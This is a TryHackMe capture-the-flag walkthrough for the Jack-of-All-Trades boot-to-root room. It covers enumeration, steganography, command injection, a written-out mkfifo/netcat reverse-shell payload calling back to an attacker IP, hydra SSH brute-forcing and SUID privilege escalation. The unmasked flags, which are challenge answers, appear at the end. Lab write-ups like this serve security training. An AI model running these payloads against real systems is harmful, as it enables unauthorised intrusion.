# TryHackMe - Jack-of-All-Trades Write-Up

## 📌 Room Context
- Difficulty: Medium  
- Style: Boot-to-Root  
- Original Event: **Securi-Tay 2020**  
- Skills Tested: Enumeration, encoding/decoding, steganography, brute-forcing, reverse shells, privilege escalation  
- Author: Karthik
---

## 🔎 1. Enumeration

### Nmap Scan
```bash
nmap -sV ip
````
Results:

    Port 22/tcp → Apache (HTTP)

    Port 80/tcp → OpenSSH

👉 Services swapped: web runs on port 22, SSH on port 80.
Accessing Web Service

Firefox blocks HTTP on port 22.
Fix:

    Go to about:config.

    Add 22 to network.security.ports.banned.override.

    Visit:

Always show details

    http://10.10.115.169:22

### 2. Web Enumeration

    Source code → /recovery.php.

    Contains encoded hints: Base32 → Hex → ROT13 and Base64.

    Reveal:

        Password clue.

        Credentials hidden in header.jpg.

### 3. Steganography

Download image:

Always show details
```
wget http://10.10.115.169:22/header.jpg
```
Extract hidden file:

Always show details

steghide extract -sf header.jpg

Found cms.creds with username & password.
###💻 4. Initial Foothold

Login at /recovery.php.
Discovered command injection at ?cmd=.

Test:

Always show details
```
http://10.10.115.169:22/nnxhweOV/?cmd=id
```
### 5. Reverse Shell

Start listener:

Always show details

nc -lvnp 4444

Payload (URL-encoded):

Always show details
```
http://10.10.115.169:22/nnxhweOV/?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.9.0.185%204444%20>%20/tmp/f
```
Got shell → upgraded with:

Always show details
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
### 6. User Flag

Found password list in /home/jack/.
Brute-forced SSH on port 80:

Always show details
```
hydra -l jack -P passwords.txt ssh://10.10.115.169:80
```
Logged in → user flag inside user.jpg:

move user.jpg to your machine

flag: securi-tay2020_{********************}

### Root Flag

Check SUID binaries:

Always show details
````
find / -perm -4000 -type f 2>/dev/null
````
Found /usr/bin/strings.
Read root flag:

Always show details

strings /root/root.txt

Root flag:

Always show details

securi-tay2020_{*****************}

🎯 8. Summary

    Enumeration: Odd ports → HTTP on 22, SSH on 80.

    Exploitation: Encoded hints, stego, CMS creds.

    Foothold: Command injection → reverse shell.

    User: Hydra brute-force SSH.

    Root: Abused SUID strings.

Flags

    User: securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}

    Root: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}

✅ Challenge complete — machine fully compromised.
